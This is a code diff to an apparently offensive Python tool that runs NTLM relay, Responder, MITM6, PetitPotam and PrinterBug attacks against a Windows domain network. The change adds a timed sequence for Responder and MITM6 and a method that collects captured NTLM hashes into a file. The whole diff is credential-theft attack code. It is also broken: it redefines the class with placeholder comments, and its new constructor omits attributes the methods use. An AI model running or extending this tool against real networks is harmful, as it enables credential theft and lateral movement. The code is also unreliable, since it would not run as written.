@@ -385,8 +385,40 @@ class HashCapture:
             self.logger.error(f"Error in start_printerbug: {e}")
             return False
 
+class HashCapture:
+    def __init__(self, interface, duration=600, domain=None, creds=None, verbose=True):
+        self.interface = interface
+        self.duration = duration
+        self.domain = domain
+        self.creds = creds
+        self.verbose = verbose
+        # ... (rest of the __init__ method remains the same)
+
+    # ... (other methods remain the same)
+
+    def extract_hashes(self):
+        """Extract captured hashes and passwords from Responder and MITM6 logs"""
+        hashes = []
+
+        # Extract from Responder log
+        with open("Responder-Session.log", "r") as f:
+            for line in f:
+                if "NTLMv1" in line or "NTLMv2" in line:
+                    hashes.append(line.strip())
+
+        # Extract from MITM6 log
+        with open("mitm6.log", "r") as f:
+            for line in f:
+                if "NTLMv1" in line or "NTLMv2" in line:
+                    hashes.append(line.strip())
+
+        with open("captured_hashes.txt", "w") as f:
+            f.write("\n".join(hashes))
+
+        self.logger.info(f"Extracted {len(hashes)} hashes/passwords to captured_hashes.txt")
+
     def run(self):
-        """Main execution flow running all attacks simultaneously"""
+        """Main execution flow running all attacks"""
         self.logger.info("Starting Hash Capture Operation")
         
         # Create targets file if domain is specified
@@ -403,8 +435,6 @@ class HashCapture:
             # List of attacks to run
             attacks = [
                 ("NTLM Relay", self.start_ntlmrelay),
-                ("Responder", self.start_responder),
-                ("MITM6", self.start_mitm6),
                 ("PetitPotam", self.start_petitpotam),
                 ("PrinterBug", self.start_printerbug)
             ]
@@ -421,13 +451,32 @@ class HashCapture:
                     self.logger.info(f"{attack_name} attack thread started successfully")
                 except Exception as e:
                     self.logger.error(f"Failed to start {attack_name} attack: {e}")
+            
+            # Run Responder for the specified duration
+            self.logger.info(f"Starting Responder for {self.duration} seconds...")
+            responder_thread = Thread(target=self.start_responder)
+            responder_thread.daemon = True
+            responder_thread.start()
+            time.sleep(self.duration)
+            self.stop_event.set()
+            responder_thread.join()
+            self.stop_event.clear()
 
-            self.logger.info("All attacks initiated. Press Ctrl+C to stop...")
+            # Run MITM6 for the specified duration
+            self.logger.info(f"Starting MITM6 for {self.duration} seconds...")
+            mitm6_thread = Thread(target=self.start_mitm6)
+            mitm6_thread.daemon = True
+            mitm6_thread.start()
+            time.sleep(self.duration)
+            self.stop_event.set()
+            mitm6_thread.join()
+            self.stop_event.clear()
 
-            # Keep the main thread alive
-            while not self.stop_event.is_set():
-                time.sleep(1)
-                
+            self.logger.info("All attacks completed.")
+
+            # Extract captured hashes and passwords
+            self.extract_hashes()
+
         except KeyboardInterrupt:
             self.logger.info("Operation interrupted by user")
         except Exception as e:
@@ -440,6 +489,7 @@ class HashCapture:
 def main():
     parser = argparse.ArgumentParser(description="Hash Capture Tool")
     parser.add_argument("-i", "--interface", required=True, help="Network interface to use")
+    parser.add_argument("-t", "--time", type=int, default=600, help="Duration in seconds to run Responder and MITM6 (default: 600)")
     parser.add_argument("-d", "--domain", help="Domain name for attacks")
     parser.add_argument("-c", "--creds", help="Domain credentials in the format 'user:password'")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")
@@ -449,7 +499,7 @@ def main():
         logging.error("This script must be run as root")
         sys.exit(1)
 
-    capture = HashCapture(args.interface, args.domain, args.creds, args.verbose)
+    capture = HashCapture(args.interface, args.time, args.domain, args.creds, args.verbose)
     if not capture.run():
         sys.exit(1)
 
